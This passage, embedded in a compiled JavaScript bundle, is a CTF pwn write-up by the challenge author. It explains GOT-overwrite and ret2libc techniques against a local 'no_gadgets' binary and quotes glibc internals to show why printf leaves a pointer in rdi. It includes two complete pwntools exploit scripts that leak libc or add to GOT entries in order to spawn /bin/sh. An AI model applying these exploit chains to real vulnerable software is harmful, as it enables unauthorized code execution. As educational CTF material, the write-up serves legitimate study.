",(0,s.jsx)(n.code,{children:"buf"})," to now point to ",(0,s.jsx)(n.code,{children:"puts@LIBC"}),", giving us a leak!"]}),"\n",(0,s.jsxs)(n.p,{children:["And we don't have to worry about the return value being greater than ",(0,s.jsx)(n.code,{children:"0x80"}),", because ",(0,s.jsx)(n.code,{children:"puts"})," returns the number of bytes outputted, which would be ",(0,s.jsx)(n.code,{children:"7"})," (",(0,s.jsx)(n.code,{children:"6"})," for the address, ",(0,s.jsx)(n.code,{children:"1"})," for the newline)."]}),"\n",(0,s.jsx)(n.h3,{id:"getting-a-shell",children:"Getting a shell"}),"\n",(0,s.jsxs)(n.p,{children:["From here getting a shell is trivial. Since we have libc, we can easily find all the gadgets we need, so all we need is to write another rop chain which calls ",(0,s.jsx)(n.code,{children:'system("/bin/sh")'}),". In my rop chain I used ",(0,s.jsx)(n.code,{children:"system"}),", which also uses a lot of stack space, so I made ",(0,s.jsx)(n.code,{children:"rsp"})," point to a further up location again, but you could just use ",(0,s.jsx)(n.code,{children:"execv"})," and not face this problem."]}),"\n",(0,s.jsx)(n.h3,{id:"solver",children:"Solver"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-py",children:'#!/usr/bin/python3\nfrom pwn import *\n\ne = ELF("./vuln")\nlibc = ELF("./libc.so.6")\np = e.process()\n\ndef send(data, prompt=False, leak=False):\n    ret = None\n    if prompt:\n        p.recvuntil(b"Data: ")\n    assert b"\\n" not in data\n    p.sendline(data)\n    if leak:\n        ret = p.recv(6)\n        p.recv(1)   # newline\n    p.recvline()\n    return ret\n\ngot = 0x404000\nnew_rsp = got+0x800     # sufficiently large to not interfere with GOT\naddr_switch = new_rsp + 0x100\n# address of final rop chain\n# also sufficiently large for system\naddr_rop = new_rsp + 0x400\n\nleave_ret = e.sym.main+157\nfgets_gadget = e.sym.main+68    # fgets(rbp-0x80, 0x80, stdin) ; strlen(rbp-0x80) ; leave ; ret\n\n# the idea of "switching" is 2 consecutive "leave ; ret" gadgets\n# such that rbp is controlled to a value we want\n# as our gets_gadget and fgets_gadget relies on rbp\n# AND also ensuring rsp is a sufficiently large address\n# such that the stack activity in the writable section doesn\'t interfere with GOT\n# or cause a crash\n\n# the first "leave ; ret" sets rbp to point to a pair of "saved rbp | return address"\n# stored at `addr_switchX`, and call it new_rbp | new_ret\n# and triggers a second "leave ; ret" to then pop new_rbp into rbp, and return to new_ret\n# the 2nd "leave ; ret" also sets rsp to `addr_switchX`\n# which for our purposes is a sufficiently large address\nrbp_rip = lambda rbp, rip: p64(rbp) + p64(rip)\nswitch = lambda i: rbp_rip(addr_switch+0x10*(i-1), leave_ret)\n\n# setup pivot to writable region\noverflow  = b"\\x00".ljust(0x80, b"A")\noverflow += p64(new_rsp)\t    # saved rbp\noverflow += p64(fgets_gadget)\t# return address\nsend(overflow, prompt=True)\n\n# rsp -> [stack]\n# rbp -> new_rsp\n# fgets(rbp-0x80) -> fgets(new_rsp-0x80)\n\n# overflow\ndata  = b"\\x00".ljust(0x80, b"A")\ndata += rbp_rip(got+0x100, fgets_gadget)\n# pad upto addr_switch\ndata += b"B" * (addr_switch - (new_rsp-0x80+len(data)))\n# fgets(got) for a GOT overwrite\ndata += rbp_rip(got+0x80, fgets_gadget)\t        # switch1\n# fgets() for final ROP payload\ndata += rbp_rip(addr_rop, fgets_gadget)\t        # switch2\nsend(data)\n\n# rsp -> new_rsp+0x10 (+0x10 due to "pop rbp" and "ret")\n# rbp -> got+0x100\n# fgets(rbp-0x80) -> fgets(got+0x80)\n\n# got+0x80\nfake_rbp_rip  = switch(2)\n# overflow to do switch1\nfake_rbp_rip  = fake_rbp_rip.ljust(0x80, b"A")\nfake_rbp_rip += switch(1)\nsend(fake_rbp_rip)\n\n# overwrite GOT\n# change strlen@GOT -> puts@PLT\n# so that strlen(buf) leaks puts@GOT\noverwrite  = p64(e.plt.puts + 6)\noverwrite += p64(e.plt.puts)        # strlen@GOT\noverwrite += p64(e.plt.printf + 6)\noverwrite += p64(e.plt.fgets + 6)\n\n# after overwriting strlen@GOT -> puts@PLT\n# the GOT buffer is printed back to us due to strlen(rbp-0x80)\n# at the start of the buffer is puts@GOT\n# (which is resolved by the time of the call to puts)\n# so &puts is leaked\nlibc_leak = send(overwrite, leak=True)\n\nlibc_leak = u64(libc_leak + b"\\x00\\x00")\nlog.info(f"puts: {hex(libc_leak)}")\n\nlibc.address = libc_leak - libc.sym.puts\nlog.info(f"libc: {hex(libc.address)}")\n\n# switch(2) is done immediately afterwards\n# to then write data to addr_rop\n\n# time for a classic ret2libc\n# (addr_rop is sufficiently large enough for system\'s stack)\n\npop_rdi = libc.address + 0x2a3e5\nret = pop_rdi + 1\n\npayload  = b"\\x00".ljust(0x80, b"A")\npayload += p64(0)\npayload += p64(pop_rdi) + p64(next(libc.search(b"/bin/sh\\x00")))\npayload += p64(ret)\npayload += p64(libc.sym.system)\n\nsend(payload)\np.interactive()\n'})}),"\n",(0,s.jsx)(n.h2,{id:"other-solutions",children:"Other solutions"}),"\n",(0,s.jsxs)(n.p,{children:["While the above solution works, there's a lot of fiddling around with stack frames, ",(0,s.jsx)(n.code,{children:"rbp"})," and ",(0,s.jsx)(n.code,{children:"rsp"})," which makes it a bit clumsy at times."]}),"\n",(0,s.jsxs)(n.p,{children:["Many other solutions were able to use the idea of overwriting the GOT in a more effective way. ",(0,s.jsx)(n.code,{children:"strlen@GOT"})," was still a prime target for overwrites, as I had intended, however the way it was used was interesting."]}),"\n",(0,s.jsxs)(n.p,{children:["What caused me problems was that I would overwrite ",(0,s.jsx)(n.code,{children:"strlen@GOT"})," to point directly to a ",(0,s.jsx)(n.code,{children:"puts"})," function, which returns normally, then I would reach the end of ",(0,s.jsx)(n.code,{children:"main"}),", which forced me to use the return address to continue execution, which led to stack fiddling nonsense."]}),"\n",(0,s.jsx)(n.h3,{id:"neatest-solution",children:"Neatest solution"}),"\n",(0,s.jsxs)(n.p,{children:["However many solutions were able to keep ",(0,s.jsx)(n.code,{children:"rsp"})," on the stack the whole time. My favourite one was by ",(0,s.jsx)(n.a,{href:"https://app.hackthebox.com/users/10693",children:"laxa"}),", which overwrote ",(0,s.jsx)(n.code,{children:"strlen@GOT"})," to the part in ",(0,s.jsx)(n.code,{children:"main"})," which called ",(0,s.jsx)(n.code,{children:"printf"}),", without setting arguments."]}),"\n",(0,s.jsxs)("figure",{children:[(0,s.jsx)("img",{src:"/assets/Screenshot 2024-05-22 165139 (1).png",alt:""}),(0,s.jsx)("figcaption",{children:(0,s.jsx)("p",{children:"printf gadget"})})]}),"\n",(0,s.jsxs)(n.p,{children:["This allowed them to call ",(0,s.jsx)(n.code,{children:"printf"})," on the ",(0,s.jsx)(n.code,{children:"GOT"}),", but was also able to immediately write to the ",(0,s.jsx)(n.code,{children:"GOT"})," ",(0,s.jsx)(n.strong,{children:"again"}),", as the call to ",(0,s.jsx)(n.code,{children:"fgets"})," was immediately afterwards. Then with the leak, they could overwrite ",(0,s.jsx)(n.code,{children:"strlen@GOT"})," again to ",(0,s.jsx)(n.code,{children:"system"}),"."]}),"\n",(0,s.jsx)(n.h3,{id:"fun-with-fun-lockfile",children:"Fun with (fun)lockfile"}),"\n",(0,s.jsxs)(n.p,{children:["The funniest one was one by ",(0,s.jsx)(n.a,{href:"https://app.hackthebox.com/users/271893",children:"Nauxuron"}),", which used a quirk of ",(0,s.jsx)(n.code,{children:"printf"})," that placed a pointer to ",(0,s.jsx)(n.code,{children:"funlockfile"})," in ",(0,s.jsx)(n.code,{children:"rdi"})," after returning, so that they could then call ",(0,s.jsx)(n.code,{children:"puts"})," on that to get a libc leak."]}),"\n",(0,s.jsxs)("figure",{children:[(0,s.jsx)("img",{src:"/assets/image (115).png",alt:""}),(0,s.jsx)("figcaption",{children:(0,s.jsxs)("p",{children:["After ",(0,s.jsx)("code",{children:'printf("Data: ")'})]})})]}),"\n",(0,s.jsxs)(n.p,{children:["Interestingly when I was designing this challenge, I was using ",(0,s.jsx)(n.code,{children:"gets"}),", and discovered some nifty unintended solutions which also relied on a certain value being into ",(0,s.jsx)(n.code,{children:"rdi"})," after a call (to ",(0,s.jsx)(n.code,{children:"gets"})," in this case), which led to the ",(0,s.jsx)(n.a,{href:"../../pwn/rop-2.34+/ret2gets",children:"ret2gets"})," page. While I fixed that, I did not anticipate this happening with ",(0,s.jsx)(n.code,{children:"printf"}),", because why on earth would this happen??"]}),"\n",(0,s.jsxs)(n.p,{children:["After looking at glibc source code (yes I was that curious), I found out why. Just like with ret2gets, it's actually to do with unlocking happening at the end of the function, specifically ",(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/stdio-common/vfprintf-internal.c#L2286",children:"here"})," (and ",(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/stdio-common/vfprintf-internal.c#L1609",children:"here"})," when buffered)."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"  _IO_funlockfile (s);\n  _IO_cleanup_region_end (0);\n\n  return done;\n}\n"})}),"\n",(0,s.jsxs)(n.p,{children:["The important macros here are ",(0,s.jsx)(n.code,{children:"__libc_cleanup_region_start"})," and ",(0,s.jsx)(n.code,{children:"__libc_cleanup_region_end"}),", defined ",(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/libc-lock.h#L157",children:"here"}),"."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"/* Start critical region with cleanup.  */\n#define __libc_cleanup_region_start(DOIT, FCT, ARG)\t\t\t\\\n  {   bool _cleanup_start_doit;\t\t\t\t\t\t\\\n  struct _pthread_cleanup_buffer _buffer;\t\t\t\t\\\n  /* Non-addressable copy of FCT, so that we avoid indirect calls on\t\\\n     the non-unwinding path.  */\t\t\t\t\t\\\n  void (*_cleanup_routine) (void *) = (FCT);\t\t\t\t\\\n  _buffer.__arg = (ARG);\t\t\t\t\t\t\\\n  if (DOIT)\t\t\t\t\t\t\t\t\\\n    {\t\t\t\t\t\t\t\t\t\\\n      _cleanup_start_doit = true;\t\t\t\t\t\\\n      _buffer.__routine = _cleanup_routine;\t\t\t\t\\\n      __libc_cleanup_push_defer (&_buffer);\t\t\t\t\\\n    }\t\t\t\t\t\t\t\t\t\\\n  else\t\t\t\t\t\t\t\t\t\\\n      _cleanup_start_doit = false;\n\n/* End critical region with cleanup.  */\n#define __libc_cleanup_region_end(DOIT)\t\t\\\n  if (_cleanup_start_doit)\t\t\t\\\n    __libc_cleanup_pop_restore (&_buffer);\t\\\n  if (DOIT)\t\t\t\t\t\\\n    _cleanup_routine (_buffer.__arg);\t\t\\\n  } /* matches __libc_cleanup_region_start */\n"})}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"printf"})," stores a ",(0,s.jsx)(n.code,{children:"_pthread_cleanup_buffer"})," to keep track of how to cleanup the ",(0,s.jsx)(n.code,{children:"FILE"})," when the function returns. It does this by storing a cleanup routine, and an argument, which would be the ",(0,s.jsx)(n.code,{children:"FILE"}),". ",(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/stdio-common/vfprintf-internal.c#L2264",children:"This"})," is where that happens (in ",(0,s.jsx)(n.code,{children:"buffered_vfprintf"})," because the challenge unbuffered ",(0,s.jsx)(n.code,{children:"stdout"}),")."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"  /* Lock stream.  */\n  __libc_cleanup_region_start (1, (void (*) (void *)) &_IO_funlockfile, s);\n  _IO_flockfile (s);\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Huh look at that, the ",(0,s.jsx)(n.code,{children:"__routine"})," is ",(0,s.jsx)(n.code,{children:"_IO_funlockfile"}),", and if we look at ",(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/pthread.h#L159",children:"_pthread_cleanup_buffer"}),"."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"/* Cleanup buffers */\nstruct _pthread_cleanup_buffer\n{\n  void (*__routine) (void *);             /* Function to call.  */\n  void *__arg;                            /* Its argument.  */\n  int __canceltype;                       /* Saved cancellation type. */\n  struct _pthread_cleanup_buffer *__prev; /* Chaining of cleanup functions.  */\n};\n"})}),"\n",(0,s.jsxs)(n.p,{children:["The ",(0,s.jsx)(n.code,{children:"__routine"})," is stored at the start. And lastly, in ",(0,s.jsx)(n.code,{children:"__libc_cleanup_region_end"}),", there's this line."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"    __libc_cleanup_pop_restore (&_buffer);\n"})}),"\n",(0,s.jsxs)(n.p,{children:["So this cleanup buffer is passed to a ",(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/nptl/libc-cleanup.c#L38",children:"function"})," (that I'm personally surprised isn't inlined), and ",(0,s.jsx)(n.code,{children:"rdi"})," doesn't get changed at all, so it ends up pointing to the cleanup buffer, with ",(0,s.jsx)(n.code,{children:"funlockfile"})," being the value it ends up pointing to!"]}),"\n",(0,s.jsxs)(n.p,{children:["But what about the cleanup routine? Interestingly ",(0,s.jsx)(n.code,{children:"funlockfile"})," isn't actually executed! The ",(0,s.jsx)(n.code,{children:"0"})," in ",(0,s.jsx)(n.code,{children:"_IO_cleanup_region_end (0);"})," represents the ",(0,s.jsx)(n.code,{children:"DOIT"})," parameter, and if it's 0, then the function isn't called."]}),"\n",(0,s.jsxs)(n.p,{children:["From what I can see, this behaviour has changed in ",(0,s.jsx)(n.code,{children:"2.37"}),", at least this only happens when the application is multithreaded?"]}),"\n",(0,s.jsx)(n.h3,{id:"who-needs-leaks-anyway",children:"Who needs leaks anyway?"}),"\n",(0,s.jsxs)(n.p,{children:["This one was by ",(0,s.jsx)(n.code,{children:"nobodyisnobody"})," (on discord), and it was probably my favourite, simply for how creative it was, and also how it required no leaks at all! It managed to squeeze blood out of the stone that was the limited collection of gadgets available in the binary itself!"]}),"\n",(0,s.jsx)(n.p,{children:"It did this with the following gadgets:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"0x00000000004010bf : add bl, al ; ... ; ret\n0x000000000040115c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret\n0x000000000040115d : pop rbp ; ret\n"})}),"\n",(0,s.jsxs)(n.p,{children:["By using the above gadgets, they were able to set ",(0,s.jsx)(n.code,{children:"rbp"})," so that ",(0,s.jsx)(n.code,{children:"rbp+0x3d"})," pointed to a ",(0,s.jsx)(n.code,{children:"GOT"})," entry, then using ",(0,s.jsx)(n.code,{children:"add dword ptr [rbp - 0x3d]"}),", they could ",(0,s.jsx)(n.em,{children:"add"})," values to the ",(0,s.jsx)(n.code,{children:"GOT"})," entries, instead of overwriting them. This way, you don't need a libc leak, and you can change these functions to point to useful gadgets. However, to be able to do that, we need to be able to control ",(0,s.jsx)(n.code,{children:"ebx"}),"."]}),"\n",(0,s.jsxs)(n.p,{children:["That's where the top gadget comes in. You'll notice how I've added the ",(0,s.jsx)(n.code,{children:"..."})," which is because this is a fairly long gadget, but not a massively complex one. It's as follows:"]}),"\n",(0,s.jsxs)("figure",{children:[(0,s.jsx)("img",{src:"/assets/image (129).png",alt:""}),(0,s.jsx)("figcaption",{children:(0,s.jsx)("p",{children:(0,s.jsx)("code",{children:"add bl, al"})})})]}),"\n",(0,s.jsxs)(n.p,{children:["Adds ",(0,s.jsx)(n.code,{children:"al"})," to ",(0,s.jsx)(n.code,{children:"bl"})," (the lowest 8 bits of the ",(0,s.jsx)(n.code,{children:"eax"})," and ",(0,s.jsx)(n.code,{children:"ebx"})," registers respectively), then goes through a nop sled to end up in ",(0,s.jsx)(n.code,{children:"deregister_tm_clones"}),". This sets ",(0,s.jsx)(n.code,{children:"eax"})," to ",(0,s.jsx)(n.code,{children:"0x404040"})," (thus setting ",(0,s.jsx)(n.code,{children:"al"})," to ",(0,s.jsx)(n.code,{children:"0x40"}),"), then just returns."]}),"\n",(0,s.jsxs)(n.p,{children:["It's important to note that ",(0,s.jsx)(n.code,{children:"rbx"})," and ",(0,s.jsx)(n.code,{children:"rax"})," are set to ",(0,s.jsx)(n.code,{children:"0"})," when ",(0,s.jsx)(n.code,{children:"main"})," returns, so the first ",(0,s.jsx)(n.code,{children:"add"})," does nothing to ",(0,s.jsx)(n.code,{children:"ebx"}),", but sets ",(0,s.jsx)(n.code,{children:"al"})," to ",(0,s.jsx)(n.code,{children:"0x40"}),". Then if we call this gadget again, we can add ",(0,s.jsx)(n.code,{children:"0x40"})," to ",(0,s.jsx)(n.code,{children:"bl"}),". Then we could add this to ",(0,s.jsx)(n.code,{children:"dword ptr [rbp - 0x3d]"}),"!"]}),"\n",(0,s.jsxs)(n.p,{children:["So now we're able to add ",(0,s.jsx)(n.code,{children:"0x40"}),", ",(0,s.jsx)(n.code,{children:"0x80"})," or ",(0,s.jsx)(n.code,{children:"0xc0"})," to an arbitrary ",(0,s.jsx)(n.code,{children:"dword"}),", but how do we use this? After all it's a fairly weak primitive, since we have such limited control over ",(0,s.jsx)(n.code,{children:"ebx"}),". Wouldn't it be nice if we could get ",(0,s.jsx)(n.code,{children:"pop rbx"}),"?"]}),"\n",(0,s.jsxs)(n.p,{children:["Well it just so happens, when you add ",(0,s.jsx)(n.code,{children:"0x80"})," to ",(0,s.jsx)(n.code,{children:"setvbuf"}),", you get:"]}),"\n",(0,s.jsxs)("figure",{children:[(0,s.jsx)("img",{src:"/assets/image (130).png",alt:""}),(0,s.jsx)("figcaption",{children:(0,s.jsx)("p",{children:(0,s.jsx)("code",{children:"setvbuf+0x80"})})})]}),"\n",(0,s.jsxs)(n.p,{children:["A ",(0,s.jsx)(n.code,{children:"pop rbx"})," gadget! Fortunately the previous ",(0,s.jsx)(n.code,{children:"r13"})," checks don't pass, so we're able to reach ",(0,s.jsx)(n.code,{children:"pop rbx"}),". Now with complete control over ",(0,s.jsx)(n.code,{children:"ebx"}),", we can completely change a ",(0,s.jsx)(n.code,{children:"GOT"})," entry to ",(0,s.jsx)(n.code,{children:"system"}),", in this case we do ",(0,s.jsx)(n.code,{children:"strlen"}),", as our buffer is passed to it."]}),"\n",(0,s.jsx)(n.p,{children:"I cleaned up and slightly modified the script to get the following:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"from pwn import *\n\nexe = ELF(\"./no_gadgets\")\nlibc = ELF(\"./libc.so.6\") # needs debug symbols to know where __strlen_avx2 is\np = exe.process()\n\npop_rbp = 0x4011d5\t\t# pop rbp ; ret\nret = 0x401016\nfgets_gadget = 0x40121b\nmov_al_40 = exe.sym.deregister_tm_clones\t# mov eax, 0x404040 ; ... ; ret\nadd_bl_al = 0x4010bf\t#  add bl, al ; ... ; mov eax, 0x404040 ; ... ; ret\nadd_gadget = 0x40115c\t# add dword ptr [rbp - 0x3d], ebx ; nop ; ret\n\n\npayload  = b'A'.ljust(0x80,b'\\x00')\n# rbp+0x3d = setvbuf@GOT\npayload += p64(exe.got['setvbuf']+0x3d)\n# setvbuf@GOT = setvbuf + 0x80\npayload += p64(mov_al_40)\npayload += p64(add_bl_al)*2\npayload += p64(add_gadget)\n# setvbuf+0x80 effectively does \"pop rbx,rbp,r12,r13,r14 ; ret\"\npayload += p64(exe.sym['setvbuf'])\n# ebx = system - setvbuf\npayload += p64( (libc.sym['system']-libc.sym['__strlen_avx2']) % (1<<32) )\n# rbp+0x3d = strlen@GOT\npayload += p64(exe.got['strlen']+0x3d)\n# r12,r13,r14\npayload += p64(0)*3\n# strlen@GOT = system\npayload += p64(add_gadget)\n# rbp points to something writable\npayload += p64(pop_rbp) + p64(0x404e08)\n# stack alignment + trigger strlen() on input\npayload += p64(ret)\npayload += p64(fgets_gadget)\n\np.sendline(payload)\np.sendline(b\"/bin/sh\\x00\")\n\np.interactive()\n"})}),"\n",(0,s.jsx)(n.h3,{id:"ret2dlresolve",children:"ret2dlresolve"}),"\n",(0,s.jsx)(n.p,{children:"While I didn't see any solutions using this, I always expected that it was possible, but I left it out as I thought it was more complicated than my intended."})]})}function h(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(c,{...e})}):c(e)}},8453:(e,n,t)=>{t.d(n,{R:()=>d,x:()=>o});var r=t(6540);const s={},i=r.createContext(s);function d(e){const n=r.useContext(i);return r.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:d(e.components),r.createElement(i.Provider,{value:n},e.children)}}}]);